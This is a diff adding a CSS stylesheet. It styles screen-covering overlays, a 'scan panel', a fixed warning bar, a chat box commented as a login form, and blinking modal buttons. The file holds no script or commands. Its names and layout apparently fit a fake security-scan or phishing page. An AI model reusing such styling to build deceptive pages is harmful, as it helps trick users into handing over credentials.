@@ -1,0 +1,460 @@
+::after, ::before { line-height: normal; }
+
+body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+/* Loader */
+.loader_bg {
+  position: fixed;
+  z-index: 99;
+  background: #aaaaab;
+  width: 100%;
+  height: 100%;
+  opacity: .8;
+}
+.loader {
+  height: 100%;
+  width: 100%;
+  position: absolute;
+  left: 0;
+  top: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  display: none;
+}
+.loader_bgg {
+  position: fixed;
+  z-index: 999999999;
+  background: black;
+  width: 100%;
+  height: 100%;
+  opacity: 1;
+}
+.loader1 {
+  height: 100%;
+  width: 100%;
+  position: absolute;
+  left: 0;
+  top: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Animations */
+@keyframes example1 {
+  0%   { bottom: -0px; }
+  100% { bottom: -900px; }
+}
+@keyframes example {
+  0%   { bottom: -0px; }
+  100% { bottom: -900px; }
+}
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50%      { opacity: 0; }
+}
+
+/* Buttons & Controls */
+.minimize {
+  float: right;
+  margin-top: 2px;
+  margin-right: 10px;
+  cursor: pointer;
+  padding: 2px;
+  transition: background-color 0.2s, color 0.2s;
+  border-radius: 50%;
+  width: 28px;
+  height: 28px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.minimize:hover {
+  margin-top: 2px;
+  background-color: #dc3545;
+  color: white;
+  transform: scale(1.1);
+}
+.minimize1 {
+  float: right;
+  margin-top: 2px;
+  cursor: pointer;
+  height: 34px;
+  width: 24px;
+}
+.minimize1:hover {
+  margin-top: 2px;
+  background-color: red;
+  color: white;
+}
+
+.topp {
+  margin-top: 0px;
+  width: auto;
+  background-color: #106eb6;
+  padding: 35px 15px 20px;
+  color: white;
+}
+.den {
+  width: 100%;
+  height: 70px;
+  cursor: pointer;
+  border: .2px solid white;
+  transition: background-color 0.2s;
+}
+.den:hover {
+  border: 1px solid white;
+  background-color: #205a8c;
+}
+.button {
+  background-color: #106eb6;
+  border: 1px solid white;
+  color: white;
+  padding: 10px 25px;
+  text-align: center;
+  text-decoration: none;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+  margin-left: 85%;
+  margin-top: 25px;
+  border-radius: 6px;
+  transition: background-color 0.2s;
+}
+.button:hover {
+  background-color: #205a8c;
+  border: 1.5px solid white;
+}
+.ilb {
+  display: inline-block;
+  text-align: center;
+}
+.ilb2 {
+  background-color: #cbc9c9;
+  border-bottom: 1px solid black;
+  padding: 4px 8px;
+}
+
+/* Top warning bar */
+#top2 {
+  position: fixed;
+  margin: 0px auto;
+  text-align: center;
+  width: 100%;
+  height: auto;
+  background-color: #282c32;
+  opacity: .98;
+  z-index: 999999999;
+  color: white;
+  font-size: 16px;
+  padding: 15px;
+  border: 2px solid #6f6f6f;
+  text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+}
+
+/* Footer bar */
+.niche {
+  position: fixed;
+  height: 60px;
+  width: 100%;
+  background-color: #205a8c;
+  z-index: 99999;
+  bottom: 0px;
+  text-align: center;
+  box-shadow: 0 -2px 10px rgba(0,0,0,0.3);
+}
+
+/* Scan panel */
+#scan {
+  position: fixed;
+  background-color: white;
+  height: 450px;
+  border-radius: 4px;
+  width: 45%;
+  padding: 0px;
+  z-index: 99;
+  box-shadow: 25px 25px 25px 25px rgba(0,0,0,.4);
+  position: absolute;
+  bottom: 28%;
+  left: 28%;
+  font-family: sans serif;
+  color: black;
+  display: inline-block;
+  animation-name: example;
+  animation-duration: .5s;
+  animation-direction: reverse;
+}
+#dixon {
+  width: 80%;
+  height: 100px;
+  margin-left: 10%;
+  margin-top: 20px;
+  border: 1px solid red;
+  border-radius: 6px;
+  background: #fff5f5;
+  padding: 8px;
+}
+.nen, .nen1, .nen2, .nen3 {
+  display: none;
+  width: 100%;
+  height: 20px;
+  cursor: pointer;
+  border: .2px solid black;
+  transition: background-color 0.2s;
+  border-radius: 3px;
+  padding: 2px 6px;
+  margin: 2px 0;
+}
+.nen:hover, .nen1:hover, .nen2:hover, .nen3:hover {
+  background-color: #ffe0e0;
+}
+
+/* Chat bg overlay */
+#chatbg {
+  display: none;
+  position: fixed;
+  z-index: 9999;
+  background: black;
+  width: 100%;
+  height: 100%;
+  opacity: .8;
+}
+
+/* Chat box (login form) */
+#chat-box {
+  background-color: #1e1e2e;
+  padding: 5px;
+  position: fixed;
+  width: 40%;
+  height: auto;
+  bottom: 25%;
+  left: 30%;
+  z-index: 9999999999999;
+  border-radius: 12px;
+  border-style: solid;
+  border-color: #3a3a5c;
+  text-align: center;
+  opacity: .98;
+  display: none;
+  box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
+  animation-name: example;
+  animation-duration: .5s;
+  animation-direction: reverse;
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255,255,255,0.1);
+}
+input[type=text] {
+  background-color: #2a2a3e;
+  color: white;
+  width: 70%;
+  height: 20px;
+  margin-bottom: 20px;
+  padding: 12px;
+  border: 1px solid #444;
+  border-radius: 8px;
+  transition: border-color 0.3s, box-shadow 0.3s;
+  outline: none;
+}
+input[type=text]:focus {
+  border-color: #106eb6;
+  box-shadow: 0 0 8px rgba(16, 110, 182, 0.4);
+}
+.button1 {
+  background-color: #106eb6;
+  color: white;
+  width: 40%;
+  padding: 10px 20px;
+  text-align: center;
+  display: inline-block;
+  font-size: 16px;
+  margin: 10px 2px;
+  cursor: pointer;
+  border: none;
+  border-radius: 8px;
+  transition: background-color 0.2s, transform 0.1s;
+  margin-bottom: 30px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+}
+.button1:hover {
+  background-color: #0d5a96;
+  transform: scale(1.05);
+}
+
+/* Floating chat widget */
+#chat {
+  background-color: white;
+  padding: 15px;
+  position: fixed;
+  bottom: 74px;
+  right: 8px;
+  z-index: 99999999;
+  border: 1px solid #106eb6;
+  border-radius: 30px;
+  box-shadow: rgba(0, 0, 0, .35) 5px 5px 5px 5px;
+  animation-name: example;
+  animation-duration: 1s;
+  animation-direction: reverse;
+  min-width: 200px;
+}
+#chat img {
+  color: #000;
+  font-size: 16px;
+  font-weight: 600;
+  margin-left: 35px;
+  width: 25px;
+}
+#chat h4 {
+  width: 217px;
+  font-size: 20px;
+  padding-top: 7px;
+  margin: 0 auto;
+  display: block;
+}
+#chat a {
+  margin: 0 auto;
+  display: block;
+}
+#chat p {
+  font-size: 16px;
+  padding-top: 7px;
+  font-weight: 400;
+}
+#chat .arrow-down {
+  position: absolute;
+  font-size: 47px;
+  color: #fff;
+  bottom: -30px;
+  left: 65px;
+}
+#chat2 img {
+  color: #000;
+  font-size: 16px;
+  font-weight: 600;
+  margin-left: 65px;
+  width: 90px;
+}
+
+/* Modal popup */
+#modalbx {
+  position: fixed;
+  top: 0;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  z-index: 99999999999;
+  display: inline-block;
+  background-color: rgba(0, 0, 0, 1);
+  background-image: url('../images/bg1.jpg');
+  width: 100%;
+  height: auto;
+  background-repeat: no-repeat;
+  background-size: 100% 100%;
+  text-align: center;
+  cursor: auto;
+}
+#modalbx .bxweb {
+  background-color: white;
+  border-radius: 12px;
+  max-width: 400px;
+  margin: 100px auto;
+  padding: 30px;
+  text-align: center;
+  position: relative;
+  z-index: 9999;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+}
+#modal-close {
+  cursor: pointer;
+  color: #888;
+  float: right;
+  font-size: 24px;
+  font-weight: bold;
+  transition: color 0.2s;
+  padding: 4px;
+}
+#modal-close:hover {
+  color: #dc3545;
+}
+#modal-image {
+  margin-bottom: 20px;
+  border-radius: 50%;
+}
+#modal-message {
+  color: black;
+  font-weight: bold;
+  margin-bottom: 20px;
+  font-size: 16px;
+}
+.modal-buttons {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 20px;
+}
+.modal-buttons button {
+  width: 100px;
+  padding: 10px 0;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  font-weight: bold;
+  font-size: 15px;
+  transition: background-color 0.3s, transform 0.2s;
+}
+.modal-buttons button.accept {
+  background-color: white;
+  color: black;
+  border: 2px solid #ddd;
+}
+.modal-buttons button.dismiss {
+  background-color: #3b5998;
+  color: white;
+}
+.modal-buttons button:hover {
+  background-color: rgba(0, 0, 0, 0.8);
+  transform: scale(1.05);
+}
+.modal-buttons button.dismiss.blinking {
+  animation: blink 1s infinite;
+}
+.blck {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  z-index: 9999;
+}
+#firstpop {
+  position: fixed;
+  background-color: #e1e2e3;
+  height: 370px;
+  border-radius: 4px;
+  width: 45%;
+  padding: 0px;
+  z-index: 99;
+  box-shadow: 25px 25px 25px 25px rgba(0,0,0,.4);
+  bottom: 28%;
+  left: 28%;
+  color: black;
+  display: inline-block;
+  animation-name: example1;
+  animation-duration: .5s;
+  animation-direction: reverse;
+}
+
+/* hula container */
+#hula {
+  display: none;
+  position: fixed;
+  z-index: 99999;
+  width: 100%;
+  height: 100%;
+}
